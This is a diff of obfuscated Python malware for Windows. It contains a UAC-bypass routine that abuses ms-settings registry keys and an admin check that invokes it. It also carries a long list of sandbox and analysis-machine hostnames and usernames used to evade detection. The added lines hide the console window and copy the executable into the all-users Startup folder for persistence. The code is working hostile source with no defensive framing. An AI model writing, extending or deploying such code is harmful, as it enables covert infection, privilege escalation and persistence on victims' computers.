@@ -5,6 +5,7 @@ _C='server'
 _B=False
 _A=True
 import subprocess,ctypes,sys,base64,ctypes
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
 def UACbypass(method=1):
 	G='reg delete hkcu\\Software\\Classes\\ms-settings /f';F='reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f';C='wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text';B=method
 	if GetSelf()[1]:
@@ -21,6 +22,12 @@ def IsAdmin():return ctypes.windll.shell32.IsUserAnAdmin()==1
 def GetSelf():return sys.argv[0]
 if not IsAdmin():
 	if UACbypass():os._exit(0)
+def add_to_startup():
+	C=os.path.join(os.getenv('ProgramData'),'Microsoft','Windows','Start Menu','Programs','Startup');B=GetSelf();A=os.path.join(C,os.path.basename(B))
+	if os.path.exists(A):print('Executable is already in Startup.');return
+	try:shutil.copy2(B,A);print(f"Copied to Startup: {A}")
+	except Exception as D:print(f"Failed to copy to Startup: {D}")
+add_to_startup()
 import subprocess,getmac,os,requests,winreg,psutil,threading
 def user_check():
 	A=['Admin','BEE7370C-8C0C-4','DESKTOP-NAKFFMT','WIN-5E07COS9ALR','B30F0242-1C6A-4','DESKTOP-VRSQLAG','Q9IATRKPRH','XC64ZB','DESKTOP-D019GDM','DESKTOP-WI8CLET','SERVER1','LISA-PC','JOHN-PC','DESKTOP-B0T93D6','DESKTOP-1PYKP29','DESKTOP-1Y2433R','WILEYPC','WORK','6C4E733F-C2D9-4','RALPHS-PC','DESKTOP-WG3MYJS','DESKTOP-7XC6GEZ','DESKTOP-5OV9S0O','QarZhrdBpj','ORELEEPC','ARCHIBALDPC','JULIA-PC','d1bnJkfVlH','WDAGUtilityAccount','Abby','patex','RDhJ0CNFevzX','kEecfMwgj','Frank','8Nl0ColNQ5bq','Lisa','John','george','PxmdUOpVyx','8VizSM','w0fjuOVmCcP5A','lmVwjj9b','PqONjHVwexsS','3u2v9m8','Julia','HEUeRzl','fred',_C,'BvJChRPnsxn','Harry Johnson','SqgFOf3G','Lucas','mike','PateX','h7dk1xPr','Louise','User01','test','RGzcBUyrznReg','OgJb6GqgK0O','joshuarob']
